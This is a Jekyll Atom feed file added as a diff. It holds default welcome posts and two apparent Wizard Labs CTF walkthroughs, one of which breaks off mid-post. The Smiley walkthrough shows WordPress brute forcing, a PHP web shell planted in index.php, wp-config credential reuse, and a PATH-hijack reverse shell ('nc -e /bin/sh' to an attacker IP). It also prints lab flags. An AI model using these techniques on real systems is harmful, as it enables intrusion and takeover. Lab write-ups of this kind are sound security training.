@@ -1,0 +1,911 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2019-06-13T12:23:56+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://0.0.0.0:4000/jekyll/update/2019/06/13/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2019-06-13T12:05:29+00:00</published><updated>2019-06-13T12:05:29+00:00</updated><id>http://0.0.0.0:4000/jekyll/update/2019/06/13/welcome-to-jekyll</id><content type="html" xml:base="http://0.0.0.0:4000/jekyll/update/2019/06/13/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://0.0.0.0:4000/jekyll/update/2019/06/12/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2019-06-12T07:44:15+00:00</published><updated>2019-06-12T07:44:15+00:00</updated><id>http://0.0.0.0:4000/jekyll/update/2019/06/12/welcome-to-jekyll</id><content type="html" xml:base="http://0.0.0.0:4000/jekyll/update/2019/06/12/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Wizard Labs – Smiley</title><link href="http://0.0.0.0:4000/2019/04/26/wizard-labs-smiley/" rel="alternate" type="text/html" title="Wizard Labs &amp;#8211; Smiley" /><published>2019-04-26T11:22:07+00:00</published><updated>2019-04-26T11:22:07+00:00</updated><id>http://0.0.0.0:4000/2019/04/26/wizard-labs-smiley</id><content type="html" xml:base="http://0.0.0.0:4000/2019/04/26/wizard-labs-smiley/">&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-37.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-814&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-37.png?w=176 176w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-37.png?resize=159%2C300 159w&quot; sizes=&quot;(max-width: 176px) 100vw, 176px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Even though the difficulty of this machine was 3/10 it took me quite a while to complete it.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-815&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?w=874 874w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?resize=300%2C93 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?resize=768%2C238 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;nmap scan reveals a wordpress site running on port 80.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-816&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?w=821 821w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?resize=300%2C185 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?resize=768%2C473 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After a lot of directory searching turned up with nothing. I only had a username – smiley.&lt;/p&gt;
+
+&lt;p&gt;I forgot about the brute force method. You can use WPScan to brute force&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;⚡  ~/Desktop/smiley &lt;br /&gt;cat username  &lt;br /&gt;smiley &lt;br /&gt;wpscan --url http://10.1.1.42/ -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt -U username  &lt;/pre&gt;
+
+&lt;p&gt;Password found – music&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-40.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-818&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-40.png?w=613 613w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-40.png?resize=300%2C59 300w&quot; sizes=&quot;(max-width: 613px) 100vw, 613px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;That took me the guts of 5 hours to get that far. I’ve made a mental note not to forget about brute forcing when nothing else turns up.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-41.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-819&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-41.png?w=411 411w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-41.png?resize=290%2C300 290w&quot; sizes=&quot;(max-width: 411px) 100vw, 411px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I went to Plugins and Editor and added php code to index.php to see if I can get command execution&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?fit=680%2C104&quot; alt=&quot;&quot; class=&quot;wp-image-820&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?w=1488 1488w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?resize=300%2C46 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?resize=768%2C117 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?resize=1024%2C156 1024w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?w=1360 1360w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;?php echo shell\_exec($\_GET[&amp;#8216;cmd&amp;#8217;]); ?&gt;
+
+&lt;p&gt;I activated the Hello Dolly plugin and refreshed the index page. I always view the source when I do this as it makes the output readable.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-43.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-821&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-43.png?w=635 635w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-43.png?resize=300%2C172 300w&quot; sizes=&quot;(max-width: 635px) 100vw, 635px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Otherwise it will look like this&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-44.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-822&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-44.png?w=609 609w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-44.png?resize=300%2C116 300w&quot; sizes=&quot;(max-width: 609px) 100vw, 609px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;So I can get command execution. Now to get a nc reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-45.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-823&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-45.png?w=476 476w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-45.png?resize=300%2C62 300w&quot; sizes=&quot;(max-width: 476px) 100vw, 476px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-46.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-824&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-46.png?w=523 523w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-46.png?resize=300%2C114 300w&quot; sizes=&quot;(max-width: 523px) 100vw, 523px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;So I’m in as www-data but obviously can’t view user.txt as I’m not user mike&lt;/p&gt;
+
+&lt;pre&gt;cd /home
+$ ls
+ls
+mike
+$ cd mike
+cd mike
+/bin/sh: 5: cd: can't cd to mike
+&lt;/pre&gt;
+
+&lt;p&gt;As the server is running wordpress I knew there would be a password stored in wp-config.php&lt;/p&gt;
+
+&lt;pre&gt;// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wpdatabase');
+
+/** MySQL database username */
+define('DB_USER', 'wpuser');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'Il0veW0rdpress');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+&lt;/pre&gt;
+
+&lt;p&gt;I’ll try to ssh using it and user mike and Il0veW0rdpress as the password&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-47.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-826&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-47.png?w=682 682w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-47.png?resize=300%2C86 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;pre&gt;mike@smiley:~$ cat user.txt 
+b075f6e221bbe611fafa9b7ae3688379
+mike@smiley:~$ 
+&lt;/pre&gt;
+
+&lt;p&gt;I noticed that there is a file with SUID bit set in mike’s home directory&lt;/p&gt;
+
+&lt;pre&gt;mike@smiley:~$ ls -la listwww 
+-rwsr-xr-x 1 root root 7332 Dec 27 06:03 listwww
+mike@smiley:~$ 
+&lt;/pre&gt;
+
+&lt;p&gt;When I run it it lists the contents of /var/www/html&lt;/p&gt;
+
+&lt;pre&gt;mike@smiley:~$ ./listwww 
+index.php    readme.html  suid.c	   wp-admin	       wp-comments-post.php  wp-config.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
+license.txt  suid	  wp-activate.php  wp-blog-header.php  wp-config-sample.php  wp-content     wp-includes  wp-load.php	    wp-mail.php   wp-signup.php    xmlrpc.php
+listing /var/www/html mike@smiley:~$ 
+&lt;/pre&gt;
+
+&lt;p&gt;Doing strings listwww reveals&lt;/p&gt;
+
+&lt;pre&gt;UWVS
+[^_]
+listing /var/www/html 
+sleep 3
+/bin/ls /var/www/html
+;*2$&quot;
+GCC: (Debian 7.3.0-11) 7.3.0
+&lt;/pre&gt;
+
+&lt;p&gt;I opened the file in Ghidra and it decompiled the binary to reveal in main&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-48.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-833&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-48.png?w=433 433w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-48.png?resize=300%2C203 300w&quot; sizes=&quot;(max-width: 433px) 100vw, 433px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;It looks like it says “listing /var/www/html” then sleeps for 3 seconds then does an ls on that directory. So I need to get this binary to run code which will give me root shell. Looking at the strings again I knew that as the ls command has a fully qualified path /bin/ls I could not take advantage of this. The sleep command however wasn’t fully qualified – it had just sleep. If it was it would have read /usr/bin/sleep.&lt;/p&gt;
+
+&lt;p&gt;So in order to run this I needed to change the PATH to /home/mike and put a sleep script in there which the listwww would hopefully run.&lt;/p&gt;
+
+&lt;pre&gt;mike@smiley:~$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+mike@smiley:~$ 
+&lt;/pre&gt;
+
+&lt;pre&gt;mike@smiley:~$ export PATH=/home/mike/:$PATH
+mike@smiley:~$ echo $PATH
+/home/mike/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+mike@smiley:~$ 
+&lt;/pre&gt;
+
+&lt;p&gt;I added a nc reverse shell to sleep. Ran the listwww binary again..&lt;/p&gt;
+
+&lt;pre&gt;mike@smiley:~$ cat sleep 
+nc -e /bin/sh 10.253.0.255 443
+mike@smiley:~$ 
+&lt;/pre&gt;
+
+&lt;p&gt;and got a connection back!&lt;/p&gt;
+
+&lt;pre&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt; &lt;/span&gt;&lt;span style=&quot;background-color:#2E3436&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;⚡ &lt;/font&gt;&lt;/span&gt;&lt;span style=&quot;background-color:#3465A4&quot;&gt;&lt;font color=&quot;#2E3436&quot;&gt; ~/Desktop/smiley &lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;nc&lt;/font&gt; -lnvp 443
+listening on [any] 443 ...
+connect to [10.253.0.255] from (UNKNOWN) [10.1.1.42] 40548
+id
+uid=0(root) gid=1000(mike) groups=1000(mike)
+cat /root/root.txt
+a16c33fc59fe0a3deecf6212b60f2b9b
+&lt;/pre&gt;</content><author><name>rowbot</name></author><category term="SUID" /><category term="Wordpress" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://0.0.0.0:4000/wp-content/uploads/2019/04/image-37-176x250.png" /></entry><entry><title type="html">Wizard Labs – Beta</title><link href="http://0.0.0.0:4000/2019/04/17/wizard-labs-beta/" rel="alternate" type="text/html" title="Wizard Labs &amp;#8211; Beta" /><published>2019-04-17T19:47:38+00:00</published><updated>2019-04-17T19:47:38+00:00</updated><id>http://0.0.0.0:4000/2019/04/17/wizard-labs-beta</id><content type="html" xml:base="http://0.0.0.0:4000/2019/04/17/wizard-labs-beta/">&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-755&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?w=178 178w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?resize=156%2C300 156w&quot; sizes=&quot;(max-width: 178px) 100vw, 178px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This box lead me down a rabbit hole…damn you H4d3s. I spent a lot of time bruteforcing web panel passwords. I had bother scanning the box, nmap hung a lot of the time but eventually I got a full scan done.&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-756&quot; srcset=&quot;https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?w=969 969w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?resize=300%2C235 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?resize=768%2C602 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I tried to connect to the telnet service but got kicked out&lt;/p&gt;
+
+&lt;p&gt;Port 80 gave a website with no directories.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;No more connections are allowed to telnet server. Please try again later.Connection closed by foreign host.
+&lt;/pre&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-757&quot; srcset=&quot;https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?w=691 691w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?resize=300%2C153 300w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Port 3000 gave another website that revealed some user information and passwords.&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;/figure&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-737&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?w=788 788w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?resize=300%2C98 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?resize=768%2C251 768w&quot; sizes=&quot;(max-width: 680px) 100vw, 680px&quot; data-recalc-dims=&quot;1&quot; /&gt; &amp;lt;/figure&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;python code is as follows which revealed a user russel and passwords.&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;&lt;br /&gt;&quot;&quot;&quot;&lt;br /&gt; Just a secure password generator made by Russel T !! Used to generate passwords  mostly for file sharing protocols &lt;br /&gt; Contact:russel@beta.corp&lt;br /&gt; &quot;&quot;&quot;&lt;br /&gt; import random&lt;br /&gt; import sys&lt;br /&gt; menu = &quot;&quot;&quot;&lt;br /&gt; &lt;em&gt;_                      _&lt;/em&gt; &lt;br /&gt; / &lt;em&gt;\   / &lt;/em&gt; __ _ &lt;strong&gt;_ &lt;/strong&gt;&lt;em&gt;   / &lt;/em&gt; ___  /\ \ \&lt;br /&gt; \ \ / _ \/ &lt;strong&gt;|/ /&lt;em&gt;)/ &lt;/em&gt;` / &lt;/strong&gt;/ &lt;strong&gt;| / /&lt;em&gt;\/ &lt;/em&gt; \/  \/ / &lt;em&gt;\ \  &lt;/em&gt;&lt;/strong&gt;&lt;em&gt;/ (&lt;strong&gt;/ &lt;em&gt;/ (&lt;/em&gt;| __ __ \/ /&lt;em&gt;\  / /\  / &lt;br /&gt; _&lt;/em&gt;/___|___\/    __,&lt;em&gt;|&lt;/em&gt;&lt;/strong&gt;/&lt;strong&gt;&lt;em&gt;/_&lt;/em&gt;&lt;/strong&gt;/__&lt;/em&gt;_\ \/  &lt;br /&gt;                                 Beta Corp&lt;br /&gt; &quot;&quot;&quot;&lt;br /&gt; words = ['lollip0p','rain','summer','little','honey']&lt;br /&gt; end  = [1,2,3,4,5]&lt;br /&gt; print(menu)&lt;br /&gt; word = random.choice(words)&lt;br /&gt; num = random.choice(end)&lt;br /&gt; password = (word)+(str(num))&lt;br /&gt; print(&quot;the secure password is : {}&quot;.format(password)) &lt;/pre&gt;
+
+&lt;p&gt;In order to generate all the random passwords I created this script&lt;/p&gt;
+
+&lt;pre class=&quot;wp-block-preformatted&quot;&gt;&lt;font color=&quot;#C4A000&quot;&gt;for&lt;/font&gt; i in {1..100}; &lt;font color=&quot;#C4A000&quot;&gt;do&lt;/font&gt; &lt;font color=&quot;#4E9A06&quot;&gt;python&lt;/font&gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;passgen.py&lt;/u&gt; | &lt;font color=&quot;#4E9A06&quot;&gt;grep&lt;/font&gt; &lt;font color=&quot;#C4A000&quot;&gt;&quot;the secure password is&quot;&lt;/font&gt; &amp;gt;&amp;gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;out.pass&lt;/u&gt; | &lt;font color=&quot;#4E9A06&quot;&gt;cut&lt;/font&gt; -d&lt;font color=&quot;#C4A000&quot;&gt;&quot; &quot;&lt;/font&gt; -f6 &amp;gt;&amp;gt; &lt;u style=&quot;text-decoration-style:single&quot;&gt;list.txt&lt;/u&gt; ;&lt;font color=&quot;#C4A000&quot;&gt;done&lt;/font&gt; &lt;/pre&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
+  &lt;figure class=&quot;aligncenter&quot;&gt;&lt;img src=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?w=680&quot; alt=&quot;&quot; class=&quot;wp-image-739&quot; srcset=&quot;https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?w=155 155w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?resize=105%2C300 105w&quot; sizes=&quot;(max-width: 155px) 100vw, 155px&quot; data-recalc-dims=&quot;1&quot; /&gt;&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;picking the user russel@beta.corp and also russel and the list.txt I used hydra to try to bruteforce the login at the /user login panel and the /admin login panel&lt;/p&gt;
+
+&lt;div class=&quot;wp-block-image&quot;&gt;
